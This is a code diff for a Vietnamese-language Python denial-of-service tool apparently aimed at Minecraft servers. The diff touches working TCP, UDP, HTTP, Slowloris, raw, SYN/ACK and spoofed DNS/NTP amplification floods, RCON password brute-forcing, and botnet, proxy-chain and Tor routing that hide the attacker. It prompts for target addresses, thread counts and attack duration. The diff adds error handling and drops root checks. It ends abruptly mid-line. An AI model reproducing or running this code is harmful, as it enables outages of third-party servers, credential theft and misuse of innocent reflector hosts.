@@ -6,14 +6,16 @@ import socket
 import struct
 import time
 import string
+import itertools
 import os
 import scapy.all as scapy
 from concurrent.futures import ThreadPoolExecutor
 from queue import Queue
 from dataclasses import dataclass
-from typing import Optional, List, Tuple, Dict
+from typing import Optional, List, Dict, Tuple
 from stem.control import Controller
 from prometheus_client import Counter, Gauge, Histogram, start_http_server
+from pproxy.connection import ProxyConnection
 from datetime import datetime
 
 # Cấu hình logging
@@ -52,51 +54,60 @@ class CauHinhTanCong:
 # Quản lý tài nguyên
 class QuanLyTaiNguyen:
     def __init__(self, cau_hinh: CauHinhTanCong):
-        self.cau_hinh = cau_hinh
         self.hang_doi_proxy = Queue()
         self.hang_doi_botnet = Queue()
-        self.danh_sach_tor: List[Controller] = []
+        self.danh_sach_tor = []
         self.danh_sach_ket_noi: Dict[str, socket.socket] = {}
+        self.proxy_chain = ProxyConnection()
         self.thoi_gian_xoay_circuit = 30
-        self.proxy_chain = None
+        self.cau_hinh = cau_hinh
 
-    async def tai_proxy(self):
+    async def tai_proxy(self, api_url: str):
         try:
             async with aiohttp.ClientSession() as session:
-                async with session.get(self.cau_hinh.api_proxy) as response:
+                async with session.get(api_url, timeout=10) as response:
                     if response.status == 200:
-                        proxies = (await response.text()).splitlines()
-                        for proxy in proxies[:min(100, len(proxies))]:  # Giới hạn 100 proxy
-                            self.hang_doi_proxy.put(proxy)
-                        logger.info(f"Đã tải {self.hang_doi_proxy.qsize()} proxy SOCKS5.")
+                        proxies = [p.strip() for p in (await response.text()).splitlines() if ':' in p]
+                        if proxies:
+                            for proxy in proxies[:min(100, len(proxies))]:  # Giới hạn 100 proxy
+                                self.hang_doi_proxy.put(proxy)
+                            logger.info(f"Đã tải {self.hang_doi_proxy.qsize()} proxy SOCKS5.")
+                        else:
+                            logger.warning("Danh sách proxy trống từ API.")
                     else:
                         logger.error(f"Lỗi tải proxy: HTTP {response.status}")
-        except Exception as e:
-            logger.error(f"Lỗi tải proxy: {e}")
+        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+            logger.error(f"Lỗi tải proxy: {str(e)}")
 
-    async def tai_botnet(self):
+    async def tai_botnet(self, api_url: str):
         try:
-            if not self.cau_hinh.api_botnet:
+            if not api_url:
                 if os.path.exists("files/botnet.txt"):
                     with open("files/botnet.txt", "r") as f:
-                        bots = f.read().splitlines()
-                        for bot in bots[:min(50, len(bots))]:  # Giới hạn 50 bot
-                            self.hang_doi_botnet.put(bot)
-                    logger.info(f"Đã tải {self.hang_doi_botnet.qsize()} bot từ file.")
+                        bots = [b.strip() for b in f.read().splitlines() if ':' in b]
+                        if bots:
+                            for bot in bots:
+                                self.hang_doi_botnet.put(bot)
+                            logger.info(f"Đã tải {self.hang_doi_botnet.qsize()} bot từ file.")
+                        else:
+                            logger.warning("File botnet.txt trống.")
                 else:
-                    logger.warning("File botnet.txt không tồn tại!")
+                    logger.error("File botnet.txt không tồn tại.")
             else:
                 async with aiohttp.ClientSession() as session:
-                    async with session.get(self.cau_hinh.api_botnet) as response:
+                    async with session.get(api_url, timeout=10) as response:
                         if response.status == 200:
-                            bots = (await response.text()).splitlines()
-                            for bot in bots[:min(50, len(bots))]:
-                                self.hang_doi_botnet.put(bot)
-                            logger.info(f"Đã tải {self.hang_doi_botnet.qsize()} bot từ API.")
+                            bots = [b.strip() for b in (await response.text()).splitlines() if ':' in b]
+                            if bots:
+                                for bot in bots:
+                                    self.hang_doi_botnet.put(bot)
+                                logger.info(f"Đã tải {self.hang_doi_botnet.qsize()} bot từ API.")
+                            else:
+                                logger.warning("Danh sách bot trống từ API.")
                         else:
                             logger.error(f"Lỗi tải botnet: HTTP {response.status}")
-        except Exception as e:
-            logger.error(f"Lỗi tải botnet: {e}")
+        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+            logger.error(f"Lỗi tải botnet: {str(e)}")
 
     def khoi_tao_tor(self):
         try:
@@ -104,11 +115,13 @@ class QuanLyTaiNguyen:
                 ket_noi = Controller.from_port(port=9051 + i)
                 ket_noi.authenticate()
                 self.danh_sach_tor.append(ket_noi)
-            logger.info(f"Đã khởi tạo {self.cau_hinh.so_circuit_tor} circuit Tor.")
-            asyncio.create_task(self.xoay_vong_circuit_tor())
+                logger.info(f"Khởi tạo circuit Tor trên cổng {9051 + i} thành công.")
+            if self.danh_sach_tor:
+                asyncio.create_task(self.xoay_vong_circuit_tor())
+            else:
+                logger.warning("Không thể khởi tạo circuit Tor.")
         except Exception as e:
-            logger.error(f"Lỗi khởi tạo Tor: {e}")
-            self.danh_sach_tor = []
+            logger.error(f"Lỗi khởi tạo Tor: {str(e)}")
 
     async def xoay_vong_circuit_tor(self):
         while self.danh_sach_tor:
@@ -118,8 +131,8 @@ class QuanLyTaiNguyen:
                 logger.info("Đã xoay vòng tất cả circuit Tor.")
                 await asyncio.sleep(self.thoi_gian_xoay_circuit)
             except Exception as e:
-                logger.error(f"Lỗi xoay vòng circuit Tor: {e}")
-                await asyncio.sleep(5)
+                logger.error(f"Lỗi xoay vòng circuit Tor: {str(e)}")
+                self.danh_sach_tor = [t for t in self.danh_sach_tor if t.is_alive()]
 
     def kiem_tra_ket_noi(self, sock: socket.socket) -> bool:
         try:
@@ -139,21 +152,13 @@ class QuanLyTaiNguyen:
     def tra_ket_noi(self, loai: str, sock: socket.socket):
         if len(self.danh_sach_ket_noi) < self.cau_hinh.so_ket_noi_toi_da and self.kiem_tra_ket_noi(sock):
             self.danh_sach_ket_noi[loai] = sock
-        else:
-            sock.close()
 
-    def lay_proxy(self) -> Optional[Tuple[str, int]]:
+    def lay_proxy(self) -> Optional[tuple]:
         if not self.hang_doi_proxy.empty():
             proxy = self.hang_doi_proxy.get().split(':')
-            return proxy[0], int(proxy[1])
-        logger.warning("Hàng đợi proxy trống!")
-        return None
-
-    def lay_bot(self) -> Optional[Tuple[str, int]]:
-        if not self.hang_doi_botnet.empty():
-            bot = self.hang_doi_botnet.get().split(':')
-            return bot[0], int(bot[1])
-        logger.warning("Hàng đợi botnet trống!")
+            if len(proxy) == 2 and proxy[0] and proxy[1].isdigit():
+                return proxy[0], int(proxy[1])
+        logger.warning("Hàng đợi proxy trống hoặc định dạng không hợp lệ.")
         return None
 
     async def lay_proxy_chain(self) -> Optional[str]:
@@ -162,7 +167,15 @@ class QuanLyTaiNguyen:
             proxy2 = self.lay_proxy()
             if proxy1 and proxy2:
                 return f"socks5://{proxy1[0]}:{proxy1[1]}->socks5://{proxy2[0]}:{proxy2[1]}"
-        logger.warning("Không đủ proxy cho chuỗi proxy!")
+        logger.warning("Không đủ proxy hợp lệ để tạo chuỗi proxy.")
+        return None
+
+    def lay_bot(self) -> Optional[tuple]:
+        if not self.hang_doi_botnet.empty():
+            bot = self.hang_doi_botnet.get().split(':')
+            if len(bot) == 2 and bot[0] and bot[1].isdigit():
+                return bot[0], int(bot[1])
+        logger.warning("Hàng đợi botnet trống hoặc định dạng không hợp lệ.")
         return None
 
 # Tạo gói tin Minecraft
@@ -179,8 +192,8 @@ class GoiTinMinecraft:
             phien_ban = struct.unpack('>H', phan_hoi[2:4])[0] if len(phan_hoi) > 4 else random.choice([47, 340, 754, 759])
             sock.close()
             return phien_ban
-        except (socket.timeout, socket.error):
-            logger.warning(f"Không thể phân tích phiên bản cho {ip}:{cong}, dùng giá trị ngẫu nhiên.")
+        except (socket.timeout, socket.error, struct.error):
+            logger.warning(f"Không phân tích được phiên bản cho {ip}:{cong}, sử dụng giá trị ngẫu nhiên.")
             return random.choice([47, 340, 754, 759])
 
     @staticmethod
@@ -233,6 +246,7 @@ class TanCongCoBan:
             sock.close()
         except (socket.timeout, socket.error):
             self.toc_do_hien_tai = min(self.toc_do_hien_tai * 1.5, 0.5)
+            logger.warning(f"Không đo được độ trễ cho {ip}:{cong}, tăng độ trễ.")
 
     async def thuc_hien(self, id_luong: int, ip: str, cong: int):
         raise NotImplementedError
@@ -245,14 +259,18 @@ class TanCongTCP(TanCongCoBan):
         so_goi_tin = 0
         while time.time() < thoi_diem_ket_thuc:
             for _ in range(self.so_lan_thu_lai):
-                proxy = await self.tai_nguyen.lay_proxy_chain() if self.cau_hinh.su_dung_proxy else None
                 try:
                     with thoi_gian_tan_cong.labels(loai_tan_cong='tcp').time():
+                        proxy = await self.tai_nguyen.lay_proxy_chain() if self.cau_hinh.su_dung_proxy else None
                         sock = self.tai_nguyen.lay_ket_noi('tcp')
-                        if self.cau_hinh.su_dung_tor:
+                        if self.cau_hinh.su_dung_tor and self.tai_nguyen.danh_sach_tor:
                             tor_port = 9050 + random.randint(0, len(self.tai_nguyen.danh_sach_tor) - 1)
                             sock.bind(('localhost', tor_port))
-                        muc_tieu = (ip, cong) if not proxy else proxy
+                        muc_tieu = (ip, cong)  # Mặc định
+                        if proxy:
+                            muc_tieu = proxy
+                        elif self.tai_nguyen.lay_proxy():
+                            muc_tieu = self.tai_nguyen.lay_proxy()
                         await self.loop.run_in_executor(None, sock.connect_ex, muc_tieu)
                         handshake = GoiTinMinecraft.tao_handshake(ip, cong, phien_ban)
                         login = GoiTinMinecraft.tao_login()
@@ -264,15 +282,14 @@ class TanCongTCP(TanCongCoBan):
                         await asyncio.sleep(self.toc_do_hien_tai)
                         self.tai_nguyen.tra_ket_noi('tcp', sock)
                         break
-                except (socket.timeout, socket.error, ConnectionError):
-                    if sock:
+                except (socket.error, asyncio.TimeoutError) as e:
+                    if 'sock' in locals() and sock:
                         sock.close()
+                    logger.warning(f"Lỗi TCP luồng {id_luong} tại {ip}:{cong}: {str(e)}")
                     await asyncio.sleep(0.1)
-                except Exception as e:
-                    logger.error(f"Lỗi TCP {id_luong} tại {ip}:{cong}: {e}")
-                    if sock:
+                finally:
+                    if 'sock' in locals() and sock:
                         sock.close()
-                    break
         logger.info(f"Luồng TCP {id_luong} gửi {so_goi_tin} gói tin tới {ip}:{cong}")
 
 # Tấn công UDP Flood
@@ -282,21 +299,21 @@ class TanCongUDP(TanCongCoBan):
         so_goi_tin = 0
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setblocking(False)
-        while time.time() < thoi_diem_ket_thuc:
-            try:
-                with thoi_gian_tan_cong.labels(loai_tan_cong='udp').time():
-                    goi_tin = os.urandom(self.cau_hinh.kich_thuoc_goi_tin)
-                    sock.sendto(goi_tin, (ip, cong))
-                    so_goi_tin += 1
-                    goi_tin_tan_cong.labels(loai_tan_cong='udp', may_chu=ip).inc()
-                    await self.dieu_chinh_toc_do(ip, cong)
-                    await asyncio.sleep(self.toc_do_hien_tai)
-            except (socket.error, OSError):
-                await asyncio.sleep(0.01)
-            except Exception as e:
-                logger.error(f"Lỗi UDP {id_luong} tại {ip}:{cong}: {e}")
-                break
-        sock.close()
+        try:
+            while time.time() < thoi_diem_ket_thuc:
+                try:
+                    with thoi_gian_tan_cong.labels(loai_tan_cong='udp').time():
+                        goi_tin = os.urandom(self.cau_hinh.kich_thuoc_goi_tin)
+                        sock.sendto(goi_tin, (ip, cong))
+                        so_goi_tin += 1
+                        goi_tin_tan_cong.labels(loai_tan_cong='udp', may_chu=ip).inc()
+                        await self.dieu_chinh_toc_do(ip, cong)
+                        await asyncio.sleep(self.toc_do_hien_tai)
+                except (socket.error, OSError) as e:
+                    logger.warning(f"Lỗi UDP luồng {id_luong} tại {ip}:{cong}: {str(e)}")
+                    await asyncio.sleep(0.01)
+        finally:
+            sock.close()
         logger.info(f"Luồng UDP {id_luong} gửi {so_goi_tin} gói tin tới {ip}:{cong}")
 
 # Tấn công HTTP Flood
@@ -325,47 +342,44 @@ class TanCongHTTP(TanCongCoBan):
                             await self.dieu_chinh_toc_do(ip, 80)
                             await asyncio.sleep(self.toc_do_hien_tai)
                             break
-                    except (aiohttp.ClientError, asyncio.TimeoutError):
+                    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                        logger.warning(f"Lỗi HTTP luồng {id_luong} tại {ip}: {str(e)}")
                         await asyncio.sleep(0.1)
-                    except Exception as e:
-                        logger.error(f"Lỗi HTTP {id_luong} tại {ip}: {e}")
-                        break
-        logger.info(f"Luồng HTTP {id_luong} gửi {so_yeu_cau} yêu cầu đến {ip}")
+        logger.info(f"Luồng HTTP {id_luong} gửi {so_yeu_cau} yêu cầu tới {ip}")
 
 # Tấn công Slowloris
 class TanCongSlowloris(TanCongCoBan):
     async def thuc_hien(self, id_luong: int, ip: str, cong: int):
         thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
         danh_sach_socket = []
-        while time.time() < thoi_diem_ket_thuc:
-            try:
-                with thoi_gian_tan_cong.labels(loai_tan_cong='slowloris').time():
-                    sock = self.tai_nguyen.lay_ket_noi('slowloris')
-                    if self.cau_hinh.su_dung_tor:
-                        tor_port = 9050 + random.randint(0, len(self.tai_nguyen.danh_sach_tor) - 1)
-                        sock.bind(('localhost', tor_port))
-                    proxy = await self.tai_nguyen.lay_proxy_chain() if self.cau_hinh.su_dung_proxy else None
-                    muc_tieu = (ip, 80) if not proxy else proxy
-                    await self.loop.run_in_executor(None, sock.connect_ex, muc_tieu)
-                    sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\n".encode())
-                    danh_sach_socket.append(sock)
-                    await asyncio.sleep(random.uniform(0.1, 0.5))
-                    for s in danh_sach_socket[:]:
-                        try:
-                            s.send(f"X-{random.randint(1, 1000)}: {random.randint(1, 1000)}\r\n".encode())
-                        except (socket.error, ConnectionError):
-                            danh_sach_socket.remove(s)
-                            s.close()
-            except (socket.error, ConnectionError):
-                if sock:
-                    sock.close()
-            except Exception as e:
-                logger.error(f"Lỗi Slowloris {id_luong} tại {ip}: {e}")
-                if sock:
-                    sock.close()
-        for s in danh_sach_socket:
-            s.close()
-        logger.info(f"Luồng Slowloris {id_luong} hoàn thành với {ip}")
+        try:
+            while time.time() < thoi_diem_ket_thuc:
+                try:
+                    with thoi_gian_tan_cong.labels(loai_tan_cong='slowloris').time():
+                        sock = self.tai_nguyen.lay_ket_noi('slowloris')
+                        if self.cau_hinh.su_dung_tor and self.tai_nguyen.danh_sach_tor:
+                            tor_port = 9050 + random.randint(0, len(self.tai_nguyen.danh_sach_tor) - 1)
+                            sock.bind(('localhost', tor_port))
+                        proxy = self.tai_nguyen.lay_proxy() if self.cau_hinh.su_dung_proxy else None
+                        muc_tieu = proxy or (ip, 80)
+                        await self.loop.run_in_executor(None, sock.connect_ex, muc_tieu)
+                        sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\n".encode())
+                        danh_sach_socket.append(sock)
+                        await asyncio.sleep(random.uniform(0.1, 0.5))
+                        for s in danh_sach_socket[:]:
+                            try:
+                                s.send(f"X-{random.randint(1, 1000)}: {random.randint(1, 1000)}\r\n".encode())
+                            except (socket.error, OSError):
+                                danh_sach_socket.remove(s)
+                                s.close()
+                except (socket.error, OSError) as e:
+                    if sock:
+                        sock.close()
+                    logger.warning(f"Lỗi Slowloris luồng {id_luong} tại {ip}: {str(e)}")
+        finally:
+            for s in danh_sach_socket:
+                s.close()
+        logger.info(f"Luồng Slowloris {id_luong} hoàn tất với {ip}")
 
 # Tấn công RCON
 class TanCongRCON(TanCongCoBan):
@@ -373,7 +387,7 @@ class TanCongRCON(TanCongCoBan):
         thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
         try:
             with open("files/mat_khau_rcon.txt", "r") as f:
-                mat_khau = f.read().splitlines()
+                mat_khau = [mk.strip() for mk in f.read().splitlines() if mk.strip()]
         except FileNotFoundError:
             mat_khau = [''.join(random.choices(string.ascii_letters + string.digits, k=8)) for _ in range(1000)]
             logger.warning("File mat_khau_rcon.txt không tồn tại, tạo danh sách ngẫu nhiên.")
@@ -396,16 +410,11 @@ class TanCongRCON(TanCongCoBan):
                             return
                         self.tai_nguyen.tra_ket_noi('rcon', sock)
                         break
-                except (socket.timeout, socket.error, ConnectionError):
+                except (socket.error, asyncio.TimeoutError) as e:
                     if sock:
                         sock.close()
+                    logger.warning(f"Lỗi RCON luồng {id_luong} tại {ip}: {str(e)}")
                     await asyncio.sleep(0.1)
-                except Exception as e:
-                    logger.error(f"Lỗi RCON {id_luong} tại {ip}:{self.cau_hinh.cong_rcon}: {e}")
-                    if sock:
-                        sock.close()
-                    break
-            await asyncio.sleep(self.toc_do_hien_tai)
         logger.info(f"Luồng RCON {id_luong} không tìm thấy mật khẩu cho {ip}")
 
 # Tấn công Botnet
@@ -433,13 +442,10 @@ class TanCongBotnet(TanCongCoBan):
                     await self.dieu_chinh_toc_do(ip, cong)
                     await asyncio.sleep(self.toc_do_hien_tai)
                 sock.close()
-        except (socket.error, ConnectionError):
+        except (socket.error, asyncio.TimeoutError) as e:
             if sock:
                 sock.close()
-        except Exception as e:
-            logger.error(f"Lỗi Botnet {id_luong} tại {ip}:{cong}: {e}")
-            if sock:
-                sock.close()
+            logger.error(f"Lỗi Botnet luồng {id_luong} tại {ip}: {str(e)}")
         logger.info(f"Botnet {id_luong} gửi {so_goi_tin} gói tin từ {bot_ip} tới {ip}:{cong}")
 
 # Tấn công SYN/ACK Flood
@@ -449,9 +455,6 @@ class TanCongSYNAck:
 
     def thuc_hien(self, ip: str, cong: int):
         try:
-            if os.geteuid() != 0:
-                logger.error("SYN/ACK flood yêu cầu quyền root!")
-                return
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
             thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
@@ -466,9 +469,9 @@ class TanCongSYNAck:
                     sock.sendto(goi_tin, (ip, 0))
                     goi_tin_tan_cong.labels(loai_tan_cong='syn_ack', may_chu=ip).inc()
         except PermissionError:
-            logger.error("SYN/ACK flood yêu cầu quyền root!")
-        except Exception as e:
-            logger.error(f"Lỗi SYN/ACK flood tại {ip}:{cong}: {e}")
+            logger.error(f"SYN/ACK flood tại {ip} yêu cầu quyền root!")
+        except (socket.error, OSError) as e:
+            logger.error(f"Lỗi SYN/ACK flood tại {ip}: {str(e)}")
         finally:
             if 'sock' in locals():
                 sock.close()
@@ -481,9 +484,6 @@ class TanCongRaw:
     async def thuc_hien(self, ip: str, cong: int):
         phien_ban = await GoiTinMinecraft.phan_tich_phien_ban(ip, cong)
         try:
-            if os.geteuid() != 0:
-                logger.error("Raw flood yêu cầu quyền root!")
-                return
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
             while time.time() < thoi_diem_ket_thuc:
@@ -494,41 +494,40 @@ class TanCongRaw:
                     goi_tin = ip_header + GoiTinMinecraft.tao_handshake(ip, cong, phien_ban)
                     sock.sendto(goi_tin, (ip, cong))
                     goi_tin_tan_cong.labels(loai_tan_cong='raw', may_chu=ip).inc()
+            sock.close()
         except PermissionError:
-            logger.error("Raw flood yêu cầu quyền root!")
-        except Exception as e:
-            logger.error(f"Lỗi Raw flood tại {ip}:{cong}: {e}")
+            logger.error(f"Raw flood tại {ip} yêu cầu quyền root!")
+        except (socket.error, OSError) as e:
+            logger.error(f"Lỗi raw flood tại {ip}: {str(e)}")
         finally:
             if 'sock' in locals():
                 sock.close()
 
-# Tấn công Amplification
+# Tấn công DNS/NTP Amplification
 class TanCongAmplification:
     def __init__(self, cau_hinh: CauHinhTanCong):
         self.cau_hinh = cau_hinh
 
     async def thuc_hien(self, ip: str, cong: int):
-        try:
-            if os.geteuid() != 0:
-                logger.error("Amplification yêu cầu quyền root!")
-                return
-            thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
-            while time.time() < thoi_diem_ket_thuc:
-                try:
-                    with thoi_gian_tan_cong.labels(loai_tan_cong='amplification').time():
-                        may_chu = random.choice(self.cau_hinh.danh_sach_amplification)
+        thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
+        while time.time() < thoi_diem_ket_thuc:
+            try:
+                with thoi_gian_tan_cong.labels(loai_tan_cong='amplification').time():
+                    may_chu = random.choice(self.cau_hinh.danh_sach_amplification)
+                    if scapy.get_if_list():  # Kiểm tra giao diện mạng
                         if 'ntp' in may_chu.lower():
                             goi_tin = scapy.IP(src=ip, dst=may_chu) / scapy.UDP(sport=cong, dport=123) / scapy.Raw(load=b'\x17\x00\x03\x2a' + b'\x00'*36)
                         else:
-                            goi_tin = scapy.IP(src=ip, dst=may_chu) / scapy.UDP(sport=cong, dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com"))
+                            goi_tin = scapy.IP(src=ip, dst=may_chu) / scapy.UDP(sport=cong, dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname=f"{random.randint(1,1000)}.example.com"))
                         scapy.send(goi_tin, verbose=False)
                         goi_tin_tan_cong.labels(loai_tan_cong='amplification', may_chu=ip).inc()
                         await asyncio.sleep(0.005)
-                except scapy.error.Scapy_Exception as e:
-                    logger.error(f"Lỗi gửi gói tin amplification tại {ip}: {e}")
-                    await asyncio.sleep(0.1)
-        except Exception as e:
-            logger.error(f"Lỗi Amplification tại {ip}:{cong}: {e}")
+                    else:
+                        logger.warning(f"Không tìm thấy giao diện mạng để gửi gói tin amplification tới {ip}")
+                        break
+            except (scapy.error.Scapy_Exception, OSError) as e:
+                logger.error(f"Lỗi amplification tại {ip}: {str(e)}")
+                await asyncio.sleep(0.01)
 
 # Điều phối tấn công
 class DieuPhoiTanCong:
@@ -547,101 +546,8 @@ class DieuPhoiTanCong:
 
     async def khoi_tao(self):
         if self.cau_hinh.su_dung_proxy:
-            await self.tai_nguyen.tai_proxy()
+            await self.tai_nguyen.tai_proxy(self.cau_hinh.api_proxy)
         if self.cau_hinh.su_dung_botnet:
-            await self.tai_nguyen.tai_botnet()
+            await self.tai_nguyen.tai_botnet(self.cau_hinh.api_botnet)
         if self.cau_hinh.su_dung_tor:
-            self.tai_nguyen.khoi_tao_tor()
-
-    async def chay(self):
-        start_http_server(8080)
-        nhiem_vu = []
-        if not self.cau_hinh.danh_sach_may_chu:
-            logger.error("Danh sách máy chủ rỗng!")
-            return
-        for ip, cong in self.cau_hinh.danh_sach_may_chu:
-            if self.cau_hinh.loai_tan_cong in ['raw', 'syn_ack', 'amplification']:
-                with ThreadPoolExecutor() as executor:
-                    if self.cau_hinh.loai_tan_cong == 'raw':
-                        executor.submit(TanCongRaw(self.cau_hinh).thuc_hien, ip, cong)
-                    elif self.cau_hinh.loai_tan_cong == 'syn_ack':
-                        executor.submit(TanCongSYNAck(self.cau_hinh).thuc_hien, ip, cong)
-                    else:
-                        nhiem_vu.append(TanCongAmplification(self.cau_hinh).thuc_hien(ip, cong))
-            else:
-                loai_tan_cong = self.cac_loai_tan_cong.get(self.cau_hinh.loai_tan_cong)
-                if not loai_tan_cong:
-                    logger.error(f"Loại tấn công không hợp lệ: {self.cau_hinh.loai_tan_cong}")
-                    return
-                tan_cong = loai_tan_cong(self.cau_hinh, self.tai_nguyen)
-                nhiem_vu.extend([tan_cong.thuc_hien(i + 1, ip, cong) for i in range(self.cau_hinh.so_luong_luong)])
-        await asyncio.gather(*nhiem_vu, return_exceptions=True)
-        logger.info(f"Tấn công hoàn tất vào {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-
-# Hàm chính
-async def main():
-    try:
-        danh_sach_may_chu = []
-        while True:
-            dia_chi = input("Nhập địa chỉ máy chủ (IP:Cổng, để trống để kết thúc): ").strip()
-            if not dia_chi:
-                break
-            try:
-                ip, cong = dia_chi.split(':')
-                cong = int(cong)
-                if not (0 <= cong <= 65535):
-                    raise ValueError("Cổng phải từ 0 đến 65535!")
-                danh_sach_may_chu.append((ip, cong))
-            except ValueError as e:
-                logger.error(f"Lỗi định dạng địa chỉ: {e}, thử lại!")
-                continue
-        if not danh_sach_may_chu:
-            raise ValueError("Cần ít nhất một máy chủ mục tiêu!")
-
-        loai_tan_cong = input("Chọn loại tấn công (tcp/udp/raw/http/slowloris/rcon/botnet/amplification): ").lower()
-        if loai_tan_cong not in ['tcp', 'udp', 'raw', 'http', 'slowloris', 'rcon', 'botnet', 'amplification']:
-            raise ValueError("Loại tấn công không hợp lệ!")
-
-        so_luong_luong = int(input("Nhập số lượng luồng: "))
-        if so_luong_luong <= 0:
-            raise ValueError("Số luồng phải lớn hơn 0!")
-        
-        kich_thuoc_goi = int(input("Nhập kích thước gói tin (bytes, cho UDP): "))
-        if kich_thuoc_goi <= 0:
-            raise ValueError("Kích thước gói tin phải lớn hơn 0!")
-        
-        thoi_gian_tan_cong = int(input("Nhập thời gian tấn công (giây): "))
-        if thoi_gian_tan_cong <= 0:
-            raise ValueError("Thời gian tấn công phải lớn hơn 0!")
-        
-        su_dung_proxy = input("Sử dụng proxy? (y/n): ").lower() == 'y'
-        su_dung_botnet = input("Sử dụng botnet? (y/n): ").lower() == 'y'
-        su_dung_tor = input("Sử dụng Tor? (y/n): ").lower() == 'y'
-        cong_rcon = int(input("Nhập cổng RCON (mặc định 0 để bỏ qua): ") or 0)
-        if cong_rcon and (cong_rcon < 0 or cong_rcon > 65535):
-            raise ValueError("Cổng RCON phải từ 0 đến 65535!")
-
-        cau_hinh = CauHinhTanCong(
-            danh_sach_may_chu=danh_sach_may_chu,
-            cong_rcon=cong_rcon,
-            loai_tan_cong=loai_tan_cong,
-            so_luong_luong=so_luong_luong,
-            kich_thuoc_goi_tin=kich_thuoc_goi,
-            thoi_gian_tan_cong=thoi_gian_tan_cong,
-            su_dung_proxy=su_dung_proxy,
-            su_dung_botnet=su_dung_botnet,
-            su_dung_tor=su_dung_tor
-        )
-
-        dieu_phoi = DieuPhoiTanCong(cau_hinh)
-        await dieu_phoi.khoi_tao()
-        await dieu_phoi.chay()
-    except ValueError as e:
-        logger.error(f"Lỗi nhập liệu: {e}")
-    except Exception as e:
-        logger.error(f"Lỗi không mong đợi: {e}")
-    finally:
-        logger.info("Kết thúc chương trình.")
-
-if __name__ == "__main__":
-    asyncio.run(main())
+            self.tai_ng
